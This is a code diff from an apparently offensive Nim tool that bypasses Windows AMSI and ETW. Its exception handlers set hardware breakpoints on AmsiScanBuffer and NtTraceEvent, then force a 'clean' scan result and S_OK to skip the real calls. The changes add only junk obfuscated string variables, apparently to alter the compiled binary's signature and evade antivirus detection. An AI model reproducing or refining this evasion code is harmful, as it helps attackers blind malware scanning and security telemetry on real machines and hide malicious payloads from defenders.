@@ -956,7 +956,7 @@ proc AMSIExceptionHandler(exceptions: PEXCEPTION_POINTERS): LONG {.stdcall} =
             echo "[+] Exception for AmsiScanBuffer!"
         # Get the return address by reading the value currently stored at the stack pointer
         let returnAddress = getReturnAddress(exceptions.ContextRecord)
-        
+        var randone: string = obf("lasdjhqwoiehdjasdknal")
         when defined(verbose):
             if (returnAddress == 0):
                 echo obf("[-] Return address is 0")
@@ -970,7 +970,7 @@ proc AMSIExceptionHandler(exceptions: PEXCEPTION_POINTERS): LONG {.stdcall} =
         scanResult[] = AMSI_RESULT_CLEAN
         when defined(verbose):
             echo obf("[*] New scan Result: ") & $scanResult[]
-
+        var randtwo: string = obf("lasdjhqikoasujdoaisdwoiehdjasdknal")
         # update the current instruction pointer to the caller of AmsiScanBuffer
         
         setIP(exceptions.ContextRecord, returnAddress)
@@ -984,6 +984,7 @@ proc AMSIExceptionHandler(exceptions: PEXCEPTION_POINTERS): LONG {.stdcall} =
         setResult(exceptions.ContextRecord, S_OK)
         when defined(verbose):
             echo obf("[+] S_OK set")
+        var randthree: string = obf("lasopqwiedasdjasldkjl")
         # Clear the hardware breakpoint, since we are now done with it
         when defined(oneshot):
             clearBreakpoint(exceptions.ContextRecord, 0)
@@ -1224,6 +1225,7 @@ proc ETWExceptionHandler(exceptions: PEXCEPTION_POINTERS): LONG {.stdcall.} =
     if exceptions.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP and exceptions.ExceptionRecord.ExceptionAddress == g_ntTraceEventBufferPtr:
         when defined(verbose):
             echo obf("[+] Exception for NtTraceEvent!")
+        var randten: string = obf("luazshajsuahsajsul")
         # Get the return address by reading the value currently stored at the stack pointer
         let returnAddress = getReturnAddress(exceptions.ContextRecord)
         
@@ -1237,7 +1239,7 @@ proc ETWExceptionHandler(exceptions: PEXCEPTION_POINTERS): LONG {.stdcall.} =
         setIP(exceptions.ContextRecord, returnAddress)
         when defined(verbose):
             echo obf("[*] Set Instruction pointer done")
-        
+        var randeleven: string = obf("uazahahjsgatszasau")
         # We need to adjust the stack pointer accordinly too so that we simulate a ret instruction
         adjustStackPointer(exceptions.ContextRecord, sizeof(PVOID))
         when defined(verbose):
@@ -1270,13 +1272,14 @@ when defined(HardwareETW):
             echo obf("[*] Thread ID: "), MyGetCurrentThreadId()
         else:
             echo obf("[*] Thread ID: "), GetCurrentThreadId()
-
+      var randblup13: string = obf("kasiquzashbyxncym")
       # Actually set the Breakpoint for the current Thread
       var threadCtx: CONTEXT
       threadCtx.ContextFlags = CONTEXT_ALL
 
       when defined(DInvoke):
         if MyGetThreadContext(cast[HANDLE](-2), threadCtx.addr):
+          var randtwelve: string = obf("uzaszduasdbhnjyxcbnmykj")
           enableBreakpoint(threadCtx, g_ntTraceEventBufferPtr, 1)
           discard MySetThreadContext(cast[HANDLE](-2), threadCtx.addr)
           when defined(verbose):
@@ -1286,6 +1289,7 @@ when defined(HardwareETW):
               echo obf("Breakpoint set for Thread ID: "), GetCurrentThreadId()
       else:
         if GetThreadContext(cast[HANDLE](-2), threadCtx.addr):
+            var randtwelve: string = obf("uzaszduasdbhnjyxcbnmykj")
             enableBreakpoint(threadCtx, g_ntTraceEventBufferPtr, 1)
             SetThreadContext(cast[HANDLE](-2), threadCtx.addr)
             when defined(verbose):
@@ -1309,6 +1313,7 @@ let ETWStub * = """
       else:
         var m = GetModuleHandleA(obf("ntdll"))
       var nt = cast[PIMAGE_NT_HEADERS](m + cast[PIMAGE_DOS_HEADER](m).e_lfanew)
+      var randblup: string = obf("iuazduiasdhjaskd")
       var sh = IMAGE_FIRST_SECTION(nt)
 
       var ds: ptr ULONG_PTR = nil #cast[ptr ULONG_PTR](m + sh.VirtualAddress)[]
@@ -1320,10 +1325,11 @@ let ETWStub * = """
           ds = cast[ptr ULONG_PTR](m + ntdllSectionHeader.VirtualAddress)
           cnt = ntdllSectionHeader.Misc.VirtualSize div sizeof(ULONG_PTR)
           break
-
+      var randthirteen: string = obf("uaszahhasdgahsdzt")
       when defined(verbose):
         echo obf("[*] Searching for kernel32!BaseThreadInitThunk in ntdll.dll: "), toHex(fn)
       for i in 0 ..< cnt:
+        var randblup2: string = obf("iouazdaisduia")
         if(ds[i] == fn):
           when defined(verbose):
             echo obf("[+] Found ntdll!Kernel32ThreadInitThunkFunction @ "), toHex(cast[ULONG_PTR](&ds[i]))
@@ -1345,6 +1351,7 @@ let ETWStub * = """
                 var ntdll = GetModuleHandleA(obf("ntdll.dll"))
             
             if(ntdll == 0):
+                var randblup3: string = obf("iuiazdoasdia")
                 var ModuleFileName: UNICODE_STRING
                 when defined(DInvoke):
                     MyRtlInitUnicodeString(ModuleFileName, obf("ntdll.dll"))
@@ -1373,6 +1380,7 @@ let ETWStub * = """
                     echo obf("[-] Failed to Load NtTraceEvent")
                 #return 0
                 #quit(1)
+            var randblup4: string = obf("uaszdastdtasdghaj")
         # add our vectored exception handle
         when defined(DInvoke):
             let hExHandler = MyRtlAddVectoredExceptionHandler(1, ETWExceptionHandler)
@@ -1401,6 +1409,7 @@ let ETWStub * = """
         var te32: THREADENTRY32
         te32.dwSize = DWORD(sizeof(THREADENTRY32))
         if Thread32First(hThreadSnap, addr te32) == 0:
+            var randblup11: string = obf("oasidasudash")
             when defined(verbose):
                 echo obf("[-] Failed to get first thread")
             return
@@ -1442,6 +1451,7 @@ let ETWStub * = """
             # Check if the thread already has a hardware breakpoint set
             if (threadCtx[i].Dr7 == 0) or (threadCtx[i].DR7 == DWORD64(0x0000000000000401)#[AMSI Hardware Breakpoint for Main Thread]#):
                 # Set the hardware breakpoint
+                var randblup5: string = obf("oihanyxbcyxm")
                 enableBreakPoint(threadCtx[i], g_ntTraceEventBufferPtr, 1)
                 when defined(DInvoke):
                     if MySetThreadContext(hThread, addr threadCtx[i]) == 0:
@@ -1453,6 +1463,7 @@ let ETWStub * = """
                         when defined(verbose):
                             echo obf("[-] Failed to set thread context")
                         return
+                var randblup6: string = obf("iasduasdm")
                 when defined(verbose):
                     echo obf("[+] Attached Hardware Breakpoint to Thread: ") & $threads[i]
             when defined(DInvoke):
